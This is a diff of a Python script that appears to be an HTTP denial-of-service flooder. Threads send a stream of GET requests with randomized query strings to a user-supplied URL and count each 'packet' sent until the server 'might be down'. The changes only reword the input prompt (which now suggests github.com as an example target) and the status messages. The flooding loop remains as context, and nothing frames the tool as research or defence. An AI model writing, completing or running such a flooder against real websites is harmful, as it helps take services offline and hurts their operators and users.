@@ -9,7 +9,7 @@ if os.name == 'nt':
     os.system("cls")
 else:
     os.system("clear")
-url = input("URL: mesal https://www.aparat.com  ").strip()
+url = input("URL/ ( example https://github.com ) send URL:  ").strip()
 count = 0
 headers = []
 referer = [
@@ -45,7 +45,7 @@ class httpth1(threading.Thread):
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
                 count += 1
-                print ("{0} DDoS hacke Sent".format(count))
+                print ("{0} Packet Sent / f7-bang ahoorabm".format(count))
             except requests.exceptions.ConnectionError:
                 print ("[Server might be down!]")
                 pass
@@ -53,7 +53,7 @@ class httpth1(threading.Thread):
                 print ("[URL Error]")
                 raise SystemExit()
             except ValueError:
-                print ("[Check Your URL adres site]")
+                print ("[Check Your URL address site]")
                 raise SystemExit()
             except KeyboardInterrupt:
                 print("[Canceled by User]")
